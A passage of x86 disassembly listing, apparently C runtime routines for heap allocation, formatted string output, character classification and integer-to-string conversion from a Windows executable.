  40b155:	68 e0 fc 40 00       	push   $0x40fce0
  40b15a:	68 f8 5a 40 00       	push   $0x405af8
  40b15f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40b165:	50                   	push   %eax
  40b166:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40b16d:	83 c4 f4             	add    $0xfffffff4,%esp
  40b170:	53                   	push   %ebx
  40b171:	56                   	push   %esi
  40b172:	57                   	push   %edi
  40b173:	83 3d 50 f2 45 00 03 	cmpl   $0x3,0x45f250
  40b17a:	75 57                	jne    0x40b1d3
  40b17c:	8b 45 08             	mov    0x8(%ebp),%eax
  40b17f:	3b 05 44 f2 45 00    	cmp    0x45f244,%eax
  40b185:	77 47                	ja     0x40b1ce
  40b187:	6a 09                	push   $0x9
  40b189:	e8 e2 82 ff ff       	call   0x403470
  40b18e:	83 c4 04             	add    $0x4,%esp
  40b191:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40b198:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b19b:	51                   	push   %ecx
  40b19c:	e8 3f c8 ff ff       	call   0x4079e0
  40b1a1:	83 c4 04             	add    $0x4,%esp
  40b1a4:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40b1a7:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40b1ae:	e8 02 00 00 00       	call   0x40b1b5
  40b1b3:	eb 0b                	jmp    0x40b1c0
  40b1b5:	6a 09                	push   $0x9
  40b1b7:	e8 54 83 ff ff       	call   0x403510
  40b1bc:	83 c4 04             	add    $0x4,%esp
  40b1bf:	c3                   	ret
  40b1c0:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40b1c4:	74 08                	je     0x40b1ce
  40b1c6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40b1c9:	e9 be 00 00 00       	jmp    0x40b28c
  40b1ce:	e9 8e 00 00 00       	jmp    0x40b261
  40b1d3:	83 3d 50 f2 45 00 02 	cmpl   $0x2,0x45f250
  40b1da:	0f 85 81 00 00 00    	jne    0x40b261
  40b1e0:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b1e4:	74 0e                	je     0x40b1f4
  40b1e6:	8b 55 08             	mov    0x8(%ebp),%edx
  40b1e9:	83 c2 0f             	add    $0xf,%edx
  40b1ec:	83 e2 f0             	and    $0xfffffff0,%edx
  40b1ef:	89 55 08             	mov    %edx,0x8(%ebp)
  40b1f2:	eb 07                	jmp    0x40b1fb
  40b1f4:	c7 45 08 10 00 00 00 	movl   $0x10,0x8(%ebp)
  40b1fb:	8b 45 08             	mov    0x8(%ebp),%eax
  40b1fe:	3b 05 d4 d1 45 00    	cmp    0x45d1d4,%eax
  40b204:	77 47                	ja     0x40b24d
  40b206:	6a 09                	push   $0x9
  40b208:	e8 63 82 ff ff       	call   0x403470
  40b20d:	83 c4 04             	add    $0x4,%esp
  40b210:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40b217:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b21a:	c1 e9 04             	shr    $0x4,%ecx
  40b21d:	51                   	push   %ecx
  40b21e:	e8 dd da ff ff       	call   0x408d00
  40b223:	83 c4 04             	add    $0x4,%esp
  40b226:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40b229:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40b230:	e8 02 00 00 00       	call   0x40b237
  40b235:	eb 0b                	jmp    0x40b242
  40b237:	6a 09                	push   $0x9
  40b239:	e8 d2 82 ff ff       	call   0x403510
  40b23e:	83 c4 04             	add    $0x4,%esp
  40b241:	c3                   	ret
  40b242:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40b246:	74 05                	je     0x40b24d
  40b248:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40b24b:	eb 3f                	jmp    0x40b28c
  40b24d:	8b 55 08             	mov    0x8(%ebp),%edx
  40b250:	52                   	push   %edx
  40b251:	6a 00                	push   $0x0
  40b253:	a1 4c f2 45 00       	mov    0x45f24c,%eax
  40b258:	50                   	push   %eax
  40b259:	ff 15 b0 f0 40 00    	call   *0x40f0b0
  40b25f:	eb 2b                	jmp    0x40b28c
  40b261:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b265:	75 07                	jne    0x40b26e
  40b267:	c7 45 08 01 00 00 00 	movl   $0x1,0x8(%ebp)
  40b26e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b271:	83 c1 0f             	add    $0xf,%ecx
  40b274:	83 e1 f0             	and    $0xfffffff0,%ecx
  40b277:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40b27a:	8b 55 08             	mov    0x8(%ebp),%edx
  40b27d:	52                   	push   %edx
  40b27e:	6a 00                	push   $0x0
  40b280:	a1 4c f2 45 00       	mov    0x45f24c,%eax
  40b285:	50                   	push   %eax
  40b286:	ff 15 b0 f0 40 00    	call   *0x40f0b0
  40b28c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40b28f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40b296:	5f                   	pop    %edi
  40b297:	5e                   	pop    %esi
  40b298:	5b                   	pop    %ebx
  40b299:	8b e5                	mov    %ebp,%esp
  40b29b:	5d                   	pop    %ebp
  40b29c:	c3                   	ret
  40b29d:	cc                   	int3
  40b29e:	cc                   	int3
  40b29f:	cc                   	int3
  40b2a0:	55                   	push   %ebp
  40b2a1:	8b ec                	mov    %esp,%ebp
  40b2a3:	b8 01 00 00 00       	mov    $0x1,%eax
  40b2a8:	5d                   	pop    %ebp
  40b2a9:	c3                   	ret
  40b2aa:	cc                   	int3
  40b2ab:	cc                   	int3
  40b2ac:	cc                   	int3
  40b2ad:	cc                   	int3
  40b2ae:	cc                   	int3
  40b2af:	cc                   	int3
  40b2b0:	55                   	push   %ebp
  40b2b1:	8b ec                	mov    %esp,%ebp
  40b2b3:	6a ff                	push   $0xffffffff
  40b2b5:	68 f8 fc 40 00       	push   $0x40fcf8
  40b2ba:	68 f8 5a 40 00       	push   $0x405af8
  40b2bf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40b2c5:	50                   	push   %eax
  40b2c6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40b2cd:	83 c4 f4             	add    $0xfffffff4,%esp
  40b2d0:	53                   	push   %ebx
  40b2d1:	56                   	push   %esi
  40b2d2:	57                   	push   %edi
  40b2d3:	c7 45 e4 fe ff ff ff 	movl   $0xfffffffe,-0x1c(%ebp)
  40b2da:	83 3d 50 f2 45 00 03 	cmpl   $0x3,0x45f250
  40b2e1:	75 3c                	jne    0x40b31f
  40b2e3:	6a 09                	push   $0x9
  40b2e5:	e8 86 81 ff ff       	call   0x403470
  40b2ea:	83 c4 04             	add    $0x4,%esp
  40b2ed:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40b2f4:	e8 27 cf ff ff       	call   0x408220
  40b2f9:	85 c0                	test   %eax,%eax
  40b2fb:	7d 07                	jge    0x40b304
  40b2fd:	c7 45 e4 fc ff ff ff 	movl   $0xfffffffc,-0x1c(%ebp)
  40b304:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40b30b:	e8 02 00 00 00       	call   0x40b312
  40b310:	eb 0b                	jmp    0x40b31d
  40b312:	6a 09                	push   $0x9
  40b314:	e8 f7 81 ff ff       	call   0x403510
  40b319:	83 c4 04             	add    $0x4,%esp
  40b31c:	c3                   	ret
  40b31d:	eb 43                	jmp    0x40b362
  40b31f:	83 3d 50 f2 45 00 02 	cmpl   $0x2,0x45f250
  40b326:	75 3a                	jne    0x40b362
  40b328:	6a 09                	push   $0x9
  40b32a:	e8 41 81 ff ff       	call   0x403470
  40b32f:	83 c4 04             	add    $0x4,%esp
  40b332:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40b339:	e8 32 e0 ff ff       	call   0x409370
  40b33e:	85 c0                	test   %eax,%eax
  40b340:	7d 07                	jge    0x40b349
  40b342:	c7 45 e4 fc ff ff ff 	movl   $0xfffffffc,-0x1c(%ebp)
  40b349:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40b350:	e8 02 00 00 00       	call   0x40b357
  40b355:	eb 0b                	jmp    0x40b362
  40b357:	6a 09                	push   $0x9
  40b359:	e8 b2 81 ff ff       	call   0x403510
  40b35e:	83 c4 04             	add    $0x4,%esp
  40b361:	c3                   	ret
  40b362:	6a 00                	push   $0x0
  40b364:	6a 00                	push   $0x0
  40b366:	a1 4c f2 45 00       	mov    0x45f24c,%eax
  40b36b:	50                   	push   %eax
  40b36c:	ff 15 ac f0 40 00    	call   *0x40f0ac
  40b372:	85 c0                	test   %eax,%eax
  40b374:	75 2a                	jne    0x40b3a0
  40b376:	ff 15 58 f0 40 00    	call   *0x40f058
  40b37c:	83 f8 78             	cmp    $0x78,%eax
  40b37f:	75 18                	jne    0x40b399
  40b381:	e8 8a 0d 00 00       	call   0x40c110
  40b386:	c7 00 78 00 00 00    	movl   $0x78,(%eax)
  40b38c:	e8 6f 0d 00 00       	call   0x40c100
  40b391:	c7 00 28 00 00 00    	movl   $0x28,(%eax)
  40b397:	eb 07                	jmp    0x40b3a0
  40b399:	c7 45 e4 fc ff ff ff 	movl   $0xfffffffc,-0x1c(%ebp)
  40b3a0:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40b3a3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40b3a6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40b3ad:	5f                   	pop    %edi
  40b3ae:	5e                   	pop    %esi
  40b3af:	5b                   	pop    %ebx
  40b3b0:	8b e5                	mov    %ebp,%esp
  40b3b2:	5d                   	pop    %ebp
  40b3b3:	c3                   	ret
  40b3b4:	cc                   	int3
  40b3b5:	cc                   	int3
  40b3b6:	cc                   	int3
  40b3b7:	cc                   	int3
  40b3b8:	cc                   	int3
  40b3b9:	cc                   	int3
  40b3ba:	cc                   	int3
  40b3bb:	cc                   	int3
  40b3bc:	cc                   	int3
  40b3bd:	cc                   	int3
  40b3be:	cc                   	int3
  40b3bf:	cc                   	int3
  40b3c0:	55                   	push   %ebp
  40b3c1:	8b ec                	mov    %esp,%ebp
  40b3c3:	83 ec 30             	sub    $0x30,%esp
  40b3c6:	53                   	push   %ebx
  40b3c7:	56                   	push   %esi
  40b3c8:	57                   	push   %edi
  40b3c9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b3cc:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40b3cf:	8d 4d 10             	lea    0x10(%ebp),%ecx
  40b3d2:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40b3d5:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b3d9:	75 1e                	jne    0x40b3f9
  40b3db:	68 2c fd 40 00       	push   $0x40fd2c
  40b3e0:	6a 00                	push   $0x0
  40b3e2:	6a 5d                	push   $0x5d
  40b3e4:	68 20 fd 40 00       	push   $0x40fd20
  40b3e9:	6a 02                	push   $0x2
  40b3eb:	e8 d0 e1 ff ff       	call   0x4095c0
  40b3f0:	83 c4 14             	add    $0x14,%esp
  40b3f3:	83 f8 01             	cmp    $0x1,%eax
  40b3f6:	75 01                	jne    0x40b3f9
  40b3f8:	cc                   	int3
  40b3f9:	33 d2                	xor    %edx,%edx
  40b3fb:	85 d2                	test   %edx,%edx
  40b3fd:	75 d6                	jne    0x40b3d5
  40b3ff:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40b403:	75 1e                	jne    0x40b423
  40b405:	68 10 fd 40 00       	push   $0x40fd10
  40b40a:	6a 00                	push   $0x0
  40b40c:	6a 5e                	push   $0x5e
  40b40e:	68 20 fd 40 00       	push   $0x40fd20
  40b413:	6a 02                	push   $0x2
  40b415:	e8 a6 e1 ff ff       	call   0x4095c0
  40b41a:	83 c4 14             	add    $0x14,%esp
  40b41d:	83 f8 01             	cmp    $0x1,%eax
  40b420:	75 01                	jne    0x40b423
  40b422:	cc                   	int3
  40b423:	33 c0                	xor    %eax,%eax
  40b425:	85 c0                	test   %eax,%eax
  40b427:	75 d6                	jne    0x40b3ff
  40b429:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b42c:	c7 41 0c 42 00 00 00 	movl   $0x42,0xc(%ecx)
  40b433:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b436:	8b 45 08             	mov    0x8(%ebp),%eax
  40b439:	89 42 08             	mov    %eax,0x8(%edx)
  40b43c:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b43f:	8b 55 08             	mov    0x8(%ebp),%edx
  40b442:	89 11                	mov    %edx,(%ecx)
  40b444:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b447:	c7 40 04 ff ff ff 7f 	movl   $0x7fffffff,0x4(%eax)
  40b44e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40b451:	51                   	push   %ecx
  40b452:	8b 55 0c             	mov    0xc(%ebp),%edx
  40b455:	52                   	push   %edx
  40b456:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b459:	50                   	push   %eax
  40b45a:	e8 11 11 00 00       	call   0x40c570
  40b45f:	83 c4 0c             	add    $0xc,%esp
  40b462:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40b465:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b468:	8b 51 04             	mov    0x4(%ecx),%edx
  40b46b:	83 ea 01             	sub    $0x1,%edx
  40b46e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b471:	89 50 04             	mov    %edx,0x4(%eax)
  40b474:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b477:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  40b47b:	7c 22                	jl     0x40b49f
  40b47d:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b480:	8b 02                	mov    (%edx),%eax
  40b482:	c6 00 00             	movb   $0x0,(%eax)
  40b485:	33 c9                	xor    %ecx,%ecx
  40b487:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40b48d:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40b490:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b493:	8b 02                	mov    (%edx),%eax
  40b495:	83 c0 01             	add    $0x1,%eax
  40b498:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b49b:	89 01                	mov    %eax,(%ecx)
  40b49d:	eb 11                	jmp    0x40b4b0
  40b49f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b4a2:	52                   	push   %edx
  40b4a3:	6a 00                	push   $0x0
  40b4a5:	e8 46 0e 00 00       	call   0x40c2f0
  40b4aa:	83 c4 08             	add    $0x8,%esp
  40b4ad:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40b4b0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40b4b3:	5f                   	pop    %edi
  40b4b4:	5e                   	pop    %esi
  40b4b5:	5b                   	pop    %ebx
  40b4b6:	8b e5                	mov    %ebp,%esp
  40b4b8:	5d                   	pop    %ebp
  40b4b9:	c3                   	ret
  40b4ba:	cc                   	int3
  40b4bb:	cc                   	int3
  40b4bc:	cc                   	int3
  40b4bd:	cc                   	int3
  40b4be:	cc                   	int3
  40b4bf:	cc                   	int3
  40b4c0:	55                   	push   %ebp
  40b4c1:	8b ec                	mov    %esp,%ebp
  40b4c3:	83 ec 0c             	sub    $0xc,%esp
  40b4c6:	8b 45 08             	mov    0x8(%ebp),%eax
  40b4c9:	83 c0 01             	add    $0x1,%eax
  40b4cc:	3d 00 01 00 00       	cmp    $0x100,%eax
  40b4d1:	77 17                	ja     0x40b4ea
  40b4d3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b4d6:	8b 15 04 d3 45 00    	mov    0x45d304,%edx
  40b4dc:	33 c0                	xor    %eax,%eax
  40b4de:	66 8b 04 4a          	mov    (%edx,%ecx,2),%ax
  40b4e2:	23 45 0c             	and    0xc(%ebp),%eax
  40b4e5:	e9 89 00 00 00       	jmp    0x40b573
  40b4ea:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b4ed:	c1 f9 08             	sar    $0x8,%ecx
  40b4f0:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40b4f6:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40b4fc:	8b 15 04 d3 45 00    	mov    0x45d304,%edx
  40b502:	33 c0                	xor    %eax,%eax
  40b504:	66 8b 04 4a          	mov    (%edx,%ecx,2),%ax
  40b508:	25 00 80 00 00       	and    $0x8000,%eax
  40b50d:	85 c0                	test   %eax,%eax
  40b50f:	74 22                	je     0x40b533
  40b511:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b514:	c1 f9 08             	sar    $0x8,%ecx
  40b517:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40b51d:	88 4d f4             	mov    %cl,-0xc(%ebp)
  40b520:	8a 55 08             	mov    0x8(%ebp),%dl
  40b523:	88 55 f5             	mov    %dl,-0xb(%ebp)
  40b526:	c6 45 f6 00          	movb   $0x0,-0xa(%ebp)
  40b52a:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  40b531:	eb 11                	jmp    0x40b544
  40b533:	8a 45 08             	mov    0x8(%ebp),%al
  40b536:	88 45 f4             	mov    %al,-0xc(%ebp)
  40b539:	c6 45 f5 00          	movb   $0x0,-0xb(%ebp)
  40b53d:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40b544:	6a 01                	push   $0x1
  40b546:	6a 00                	push   $0x0
  40b548:	6a 00                	push   $0x0
  40b54a:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40b54d:	51                   	push   %ecx
  40b54e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40b551:	52                   	push   %edx
  40b552:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40b555:	50                   	push   %eax
  40b556:	6a 01                	push   $0x1
  40b558:	e8 43 09 00 00       	call   0x40bea0
  40b55d:	83 c4 1c             	add    $0x1c,%esp
  40b560:	85 c0                	test   %eax,%eax
  40b562:	75 04                	jne    0x40b568
  40b564:	33 c0                	xor    %eax,%eax
  40b566:	eb 0b                	jmp    0x40b573
  40b568:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b56b:	25 ff ff 00 00       	and    $0xffff,%eax
  40b570:	23 45 0c             	and    0xc(%ebp),%eax
  40b573:	8b e5                	mov    %ebp,%esp
  40b575:	5d                   	pop    %ebp
  40b576:	c3                   	ret
  40b577:	cc                   	int3
  40b578:	cc                   	int3
  40b579:	cc                   	int3
  40b57a:	cc                   	int3
  40b57b:	cc                   	int3
  40b57c:	cc                   	int3
  40b57d:	cc                   	int3
  40b57e:	cc                   	int3
  40b57f:	cc                   	int3
  40b580:	55                   	push   %ebp
  40b581:	8b ec                	mov    %esp,%ebp
  40b583:	83 7d 10 0a          	cmpl   $0xa,0x10(%ebp)
  40b587:	75 1e                	jne    0x40b5a7
  40b589:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b58d:	7d 18                	jge    0x40b5a7
  40b58f:	6a 01                	push   $0x1
  40b591:	8b 45 10             	mov    0x10(%ebp),%eax
  40b594:	50                   	push   %eax
  40b595:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b598:	51                   	push   %ecx
  40b599:	8b 55 08             	mov    0x8(%ebp),%edx
  40b59c:	52                   	push   %edx
  40b59d:	e8 2e 00 00 00       	call   0x40b5d0
  40b5a2:	83 c4 10             	add    $0x10,%esp
  40b5a5:	eb 16                	jmp    0x40b5bd
  40b5a7:	6a 00                	push   $0x0
  40b5a9:	8b 45 10             	mov    0x10(%ebp),%eax
  40b5ac:	50                   	push   %eax
  40b5ad:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b5b0:	51                   	push   %ecx
  40b5b1:	8b 55 08             	mov    0x8(%ebp),%edx
  40b5b4:	52                   	push   %edx
  40b5b5:	e8 16 00 00 00       	call   0x40b5d0
  40b5ba:	83 c4 10             	add    $0x10,%esp
  40b5bd:	8b 45 0c             	mov    0xc(%ebp),%eax
  40b5c0:	5d                   	pop    %ebp
  40b5c1:	c3                   	ret
  40b5c2:	cc                   	int3
  40b5c3:	cc                   	int3
  40b5c4:	cc                   	int3
  40b5c5:	cc                   	int3
  40b5c6:	cc                   	int3
  40b5c7:	cc                   	int3
  40b5c8:	cc                   	int3
  40b5c9:	cc                   	int3
  40b5ca:	cc                   	int3
  40b5cb:	cc                   	int3
  40b5cc:	cc                   	int3
  40b5cd:	cc                   	int3
  40b5ce:	cc                   	int3
  40b5cf:	cc                   	int3
  40b5d0:	55                   	push   %ebp
  40b5d1:	8b ec                	mov    %esp,%ebp
  40b5d3:	83 ec 10             	sub    $0x10,%esp
  40b5d6:	8b 45 0c             	mov    0xc(%ebp),%eax
  40b5d9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b5dc:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40b5e0:	74 17                	je     0x40b5f9
  40b5e2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b5e5:	c6 01 2d             	movb   $0x2d,(%ecx)
  40b5e8:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40b5eb:	83 c2 01             	add    $0x1,%edx
  40b5ee:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40b5f1:	8b 45 08             	mov    0x8(%ebp),%eax
  40b5f4:	f7 d8                	neg    %eax
  40b5f6:	89 45 08             	mov    %eax,0x8(%ebp)
  40b5f9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b5fc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40b5ff:	8b 45 08             	mov    0x8(%ebp),%eax
  40b602:	33 d2                	xor    %edx,%edx
  40b604:	f7 75 10             	divl   0x10(%ebp)
  40b607:	89 55 f4             	mov    %edx,-0xc(%ebp)
  40b60a:	8b 45 08             	mov    0x8(%ebp),%eax
  40b60d:	33 d2                	xor    %edx,%edx
  40b60f:	f7 75 10             	divl   0x10(%ebp)
  40b612:	89 45 08             	mov    %eax,0x8(%ebp)
  40b615:	83 7d f4 09          	cmpl   $0x9,-0xc(%ebp)
  40b619:	76 16                	jbe    0x40b631
  40b61b:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40b61e:	83 c2 57             	add    $0x57,%edx
  40b621:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b624:	88 10                	mov    %dl,(%eax)
  40b626:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b629:	83 c1 01             	add    $0x1,%ecx
  40b62c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40b62f:	eb 14                	jmp    0x40b645
  40b631:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40b634:	83 c2 30             	add    $0x30,%edx
  40b637:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b63a:	88 10                	mov    %dl,(%eax)
  40b63c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b63f:	83 c1 01             	add    $0x1,%ecx
  40b642:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40b645:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b649:	77 b4                	ja     0x40b5ff
  40b64b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40b64e:	c6 02 00             	movb   $0x0,(%edx)
  40b651:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b654:	83 e8 01             	sub    $0x1,%eax
  40b657:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40b65a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b65d:	8a 11                	mov    (%ecx),%dl
  40b65f:	88 55 f0             	mov    %dl,-0x10(%ebp)
  40b662:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b665:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40b668:	8a 11                	mov    (%ecx),%dl
  40b66a:	88 10                	mov    %dl,(%eax)
  40b66c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40b66f:	8a 4d f0             	mov    -0x10(%ebp),%cl
  40b672:	88 08                	mov    %cl,(%eax)
  40b674:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40b677:	83 ea 01             	sub    $0x1,%edx
  40b67a:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40b67d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40b680:	83 c0 01             	add    $0x1,%eax
  40b683:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40b686:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40b689:	3b 4d fc             	cmp    -0x4(%ebp),%ecx
  40b68c:	72 cc                	jb     0x40b65a
  40b68e:	8b e5                	mov    %ebp,%esp
  40b690:	5d                   	pop    %ebp
  40b691:	c3                   	ret
  40b692:	cc                   	int3
  40b693:	cc                   	int3
  40b694:	cc                   	int3
  40b695:	cc                   	int3
  40b696:	cc                   	int3
  40b697:	cc                   	int3
  40b698:	cc                   	int3
  40b699:	cc                   	int3
  40b69a:	cc                   	int3
  40b69b:	cc                   	int3
  40b69c:	cc                   	int3
  40b69d:	cc                   	int3
  40b69e:	cc                   	int3
  40b69f:	cc                   	int3
  40b6a0:	55                   	push   %ebp
  40b6a1:	8b ec                	mov    %esp,%ebp
  40b6a3:	83 ec 30             	sub    $0x30,%esp
  40b6a6:	53                   	push   %ebx
  40b6a7:	56                   	push   %esi
  40b6a8:	57                   	push   %edi
  40b6a9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b6ac:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40b6af:	8d 4d 14             	lea    0x14(%ebp),%ecx
  40b6b2:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40b6b5:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40b6b9:	75 1e                	jne    0x40b6d9
  40b6bb:	68 2c fd 40 00       	push   $0x40fd2c
  40b6c0:	6a 00                	push   $0x0
  40b6c2:	6a 5d                	push   $0x5d
  40b6c4:	68 20 fd 40 00       	push   $0x40fd20
  40b6c9:	6a 02                	push   $0x2
  40b6cb:	e8 f0 de ff ff       	call   0x4095c0
  40b6d0:	83 c4 14             	add    $0x14,%esp
  40b6d3:	83 f8 01             	cmp    $0x1,%eax
  40b6d6:	75 01                	jne    0x40b6d9
  40b6d8:	cc                   	int3
  40b6d9:	33 d2                	xor    %edx,%edx
  40b6db:	85 d2                	test   %edx,%edx
  40b6dd:	75 d6                	jne    0x40b6b5
  40b6df:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40b6e3:	75 1e                	jne    0x40b703
  40b6e5:	68 10 fd 40 00       	push   $0x40fd10
  40b6ea:	6a 00                	push   $0x0
  40b6ec:	6a 5e                	push   $0x5e
  40b6ee:	68 20 fd 40 00       	push   $0x40fd20
  40b6f3:	6a 02                	push   $0x2
  40b6f5:	e8 c6 de ff ff       	call   0x4095c0
  40b6fa:	83 c4 14             	add    $0x14,%esp
  40b6fd:	83 f8 01             	cmp    $0x1,%eax
  40b700:	75 01                	jne    0x40b703
  40b702:	cc                   	int3
  40b703:	33 c0                	xor    %eax,%eax
  40b705:	85 c0                	test   %eax,%eax
  40b707:	75 d6                	jne    0x40b6df
  40b709:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b70c:	c7 41 0c 42 00 00 00 	movl   $0x42,0xc(%ecx)
  40b713:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b716:	8b 45 08             	mov    0x8(%ebp),%eax
  40b719:	89 42 08             	mov    %eax,0x8(%edx)
  40b71c:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b71f:	8b 55 08             	mov    0x8(%ebp),%edx
  40b722:	89 11                	mov    %edx,(%ecx)
  40b724:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b727:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40b72a:	89 48 04             	mov    %ecx,0x4(%eax)
  40b72d:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40b730:	52                   	push   %edx
  40b731:	8b 45 10             	mov    0x10(%ebp),%eax
  40b734:	50                   	push   %eax
  40b735:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b738:	51                   	push   %ecx
  40b739:	e8 32 0e 00 00       	call   0x40c570
  40b73e:	83 c4 0c             	add    $0xc,%esp
  40b741:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40b744:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b747:	8b 42 04             	mov    0x4(%edx),%eax
  40b74a:	83 e8 01             	sub    $0x1,%eax
  40b74d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40b750:	89 41 04             	mov    %eax,0x4(%ecx)
  40b753:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b756:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
  40b75a:	7c 22                	jl     0x40b77e
  40b75c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b75f:	8b 08                	mov    (%eax),%ecx
  40b761:	c6 01 00             	movb   $0x0,(%ecx)
  40b764:	33 d2                	xor    %edx,%edx
  40b766:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40b76c:	89 55 d0             	mov    %edx,-0x30(%ebp)
  40b76f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b772:	8b 08                	mov    (%eax),%ecx
  40b774:	83 c1 01             	add    $0x1,%ecx
  40b777:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40b77a:	89 0a                	mov    %ecx,(%edx)
  40b77c:	eb 11                	jmp    0x40b78f
  40b77e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40b781:	50                   	push   %eax
